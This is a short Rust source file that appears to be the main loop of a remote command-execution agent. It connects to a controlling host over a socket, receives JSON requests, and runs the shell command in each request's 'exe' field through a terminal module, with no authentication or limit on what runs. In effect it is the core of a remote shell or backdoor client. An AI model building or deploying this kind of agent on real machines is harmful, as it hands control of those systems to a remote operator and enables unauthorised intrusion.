use crate::communication::sock;
use crate::commands::terminal;
use std::error::Error;
use json;

pub mod communication;
pub mod commands;

fn main() {
    let mut stream = sock::establish();
    loop {
        match sock::recv(&mut stream) {
            Ok(request) => {
                println!("request: {:#}", request);
                if request["cmd"] == "c" {
                    match request["exe"].as_str() {
                        Some(command) => {
                            match terminal::execute_command(command) {
                                Ok(out) => {
                                    println!("stdout: {:?}", out);
                                }
                                Err (error) => {
                                    println!("error: {}", error);
                                    break
                                }
                            }
                        },
                        None => {
                            println!("error");
                        }
                    }
                    
                }
            },
            Err(error) => {
                println!("error: {}", error);
                break
            }
        }
    }
    
    sock::close(&mut stream);
    println!("Terminated.");
}
